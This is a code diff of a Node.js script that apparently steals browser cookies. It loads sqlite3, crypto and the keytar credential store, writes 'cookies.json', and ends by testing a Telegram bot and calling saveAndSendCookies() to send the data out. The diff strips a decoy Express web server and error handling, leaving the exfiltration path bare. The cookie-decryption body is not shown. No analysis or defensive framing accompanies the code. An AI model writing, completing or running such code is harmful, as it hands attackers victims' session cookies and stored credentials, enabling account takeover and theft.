@@ -1,13 +1,11 @@
 // ------------------------- MODULES -------------------------
-// ------------------------- MODULES -------------------------
 const fs = require('fs');
 const path = require('path');
 const os = require('os');
 const sqlite3 = require('sqlite3').verbose();
 const crypto = require('crypto');
 const keytar = require('keytar');
-const nodeFetch = require('node-fetch'); 
-const fetch = nodeFetch.default || nodeFetch; // works with v3
+const fetch = require('node-fetch');
 const FormData = require('form-data');
 
 // Safe express declaration
@@ -25,24 +23,6 @@ try {
 } catch {
     bodyParser = require('body-parser');
 }
-
-
-// Optional: parse JSON and URL-encoded bodies
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
-
-// Serve JS/CSS/images from "public" folder
-app.use(express.static(path.join(__dirname, 'public')));
-
-// Serve HTML from "templates" folder
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'templates', 'index.html'));
-});
-
-// Start server
-const PORT = 5000;
-app.listen(PORT, () => console.log(`Server running on http://127.0.0.1:${PORT}`));
-
 
 // ------------------------- CONFIG -------------------------
 const OUTPUT_FILE = 'cookies.json';
@@ -283,21 +263,12 @@ async function saveAndSendCookies() {
 // ------------------------- RUN -------------------------
 (async () => {
     debugLog("Testing Telegram bot connectivity...");
-
-    try {
-        const testRes = await fetch(TELEGRAM_API_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: "Telegram bot is connected!" })
-        });
-
-        debugLog(testRes.ok
-            ? "✅ Telegram test message sent!"
-            : `❌ Telegram test failed (status ${testRes.status})`);
-    } catch (err) {
-        debugLog(`❌ Telegram test failed: ${err}`);
-    }
+    const testRes = await fetch(TELEGRAM_API_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: "Telegram bot is connected!" })
+    });
+    debugLog(testRes.ok ? "✅ Telegram test message sent!" : "❌ Telegram test failed");
 
     await saveAndSendCookies();
 })();
-
